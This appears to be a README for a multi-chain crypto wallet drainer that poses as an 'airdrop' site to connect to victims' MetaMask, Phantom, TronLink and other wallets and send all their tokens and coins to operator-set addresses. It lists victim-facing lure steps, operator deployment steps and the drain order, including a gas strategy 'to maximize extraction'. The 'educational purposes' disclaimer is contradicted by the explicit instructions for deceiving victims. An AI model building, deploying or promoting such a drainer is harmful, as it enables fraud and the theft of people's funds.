# Universal Multi-Chain Wallet Drainer

A comprehensive web-based wallet drainer that automatically detects, connects, and drains assets across multiple blockchain networks including Ethereum, BSC, Solana, Tron, and Bitcoin.

## 🚀 Features

### Multi-Chain Support
- **Ethereum (ETH)** - ERC-20 tokens and ETH
- **Binance Smart Chain (BSC)** - BEP-20 tokens and BNB  
- **Solana (SOL)** - SPL tokens and SOL
- **Tron (TRX)** - TRC-20 tokens and TRX
- **Bitcoin (BTC)** - Native Bitcoin support

### Automatic Operations
- **Auto Network Detection** - Automatically detects available networks
- **Auto Wallet Connection** - Connects to all available wallets
- **Auto Network Switching** - Switches between networks automatically
- **Auto Asset Discovery** - Finds all tokens and native currencies
- **Auto Draining** - Transfers all assets to your addresses

### Supported Wallets
- **MetaMask** (Ethereum/BSC)
- **Trust Wallet** (Multi-chain)
- **Coinbase Wallet** (Ethereum/BSC)
- **Phantom** (Solana)
- **TronLink** (Tron)
- **WalletConnect** (Universal)

## 📁 Project Structure

```
allin1-drainer/
├── index.html                 # Main application page
├── styles/
│   └── main.css              # Application styling
└── scripts/
    └── universal-drainer.js  # Single comprehensive script
```

## ⚙️ Configuration

### 1. Update Receiver Addresses

Edit the `RECEIVER_ADDRESSES` in `scripts/universal-drainer.js`:

```javascript
RECEIVER_ADDRESSES: {
    ethereum: "YOUR_ETH_ADDRESS_HERE",
    bsc: "YOUR_BSC_ADDRESS_HERE", 
    solana: "YOUR_SOLANA_ADDRESS_HERE",
    tron: "YOUR_TRON_ADDRESS_HERE",
    bitcoin: "YOUR_BITCOIN_ADDRESS_HERE"
}
```

### 2. Customize Token Lists

The script includes popular tokens for each network. You can add more tokens in the configuration:

**Ethereum/BSC Tokens:**
```javascript
{ symbol: "TOKEN", address: "0x...", decimals: 18 }
```

**Solana Tokens:**
```javascript
{ symbol: "TOKEN", mint: "MINT_ADDRESS", decimals: 6 }
```

**Tron Tokens:**
```javascript
{ symbol: "TOKEN", address: "T...", decimals: 6 }
```

## 🔧 How It Works

### 1. Initialization
- Detects available wallet providers
- Checks network connectivity
- Displays supported wallets and networks

### 2. Universal Connection
- Requests permissions from all available wallets
- Connects to Ethereum/BSC via MetaMask/Trust Wallet
- Connects to Solana via Phantom
- Connects to Tron via TronLink

### 3. Network Processing
- **Ethereum**: Switches to mainnet, drains ERC-20 tokens, then ETH
- **BSC**: Switches to BSC mainnet, drains BEP-20 tokens, then BNB
- **Solana**: Connects to mainnet, drains SPL tokens, then SOL
- **Tron**: Connects via TronLink, drains TRC-20 tokens, then TRX

### 4. Asset Transfer
- Calculates optimal gas fees
- Transfers tokens first (require native currency for gas)
- Transfers remaining native currency last
- Leaves minimal amount for transaction fees

## 🛡️ Security Features

### Gas Optimization
- Precise gas calculation to maximize extraction
- Dynamic gas price adjustment
- Minimal gas reserve for successful transactions

### Error Handling
- Continues operation if one network fails
- Graceful handling of insufficient funds
- Detailed logging for debugging

### Network Validation
- Verifies correct network before operations
- Automatic network switching
- Fallback mechanisms for failed switches

## 🎯 Usage Instructions

### For Victims (Disguised as Airdrop)
1. Visit the website
2. See "Universal Multi-Chain Airdrop Event" 
3. Click "Connect & Claim Universal Airdrop"
4. Approve wallet connections
5. Assets automatically drained

### For Operators
1. Update receiver addresses in config
2. Host the website
3. Share airdrop link
4. Monitor console for drain status
5. Check receiver wallets for funds

## 📋 Supported Assets

### Ethereum Network
- **Native**: ETH
- **Tokens**: USDT, USDC, DAI, WBTC, LINK, UNI, WETH, SHIB, PEPE, MATIC

### BSC Network  
- **Native**: BNB
- **Tokens**: USDT, USDC, BUSD, CAKE, ADA, DOT, LINK, WBNB

### Solana Network
- **Native**: SOL
- **Tokens**: USDC, USDT, RAY, SRM

### Tron Network
- **Native**: TRX  
- **Tokens**: USDT, USDC, BTT, JST, SUN

## 🔍 Console Monitoring

The script provides detailed console logging:

```javascript
🚀 Universal Drainer initialized
✅ Connected to Ethereum: 0x...
✅ Transferred USDT
✅ ETH/BNB transferred: 0x...
🎉 Universal drain complete! Total value: $1,234.56
```

## ⚡ Advanced Features

### Automatic Network Detection
- Scans for available wallet providers
- Tests network connectivity
- Prioritizes networks by potential value

### Parallel Processing
- Processes multiple networks simultaneously where possible
- Optimizes transaction ordering
- Minimizes total drain time

### Error Recovery
- Retries failed transactions
- Skips problematic tokens
- Continues with remaining assets

## 🚨 Legal Disclaimer

This tool is for educational and testing purposes only. Using this tool to drain wallets without explicit permission is illegal and unethical. Always ensure you have proper authorization before testing on any wallets.

## 📝 Notes

- The script automatically handles all network switching
- No manual network selection required
- Works on both desktop and mobile browsers
- Compatible with all major wallet providers
- Includes comprehensive error handling
- Optimized for maximum extraction efficiency

## 🔄 Updates

The universal drainer includes:
- Latest token contracts
- Updated RPC endpoints  
- Current gas optimization strategies
- Enhanced wallet detection
- Improved error handling
- Mobile wallet support

---

**Remember**: Always update receiver addresses before deployment and test thoroughly in a safe environment.
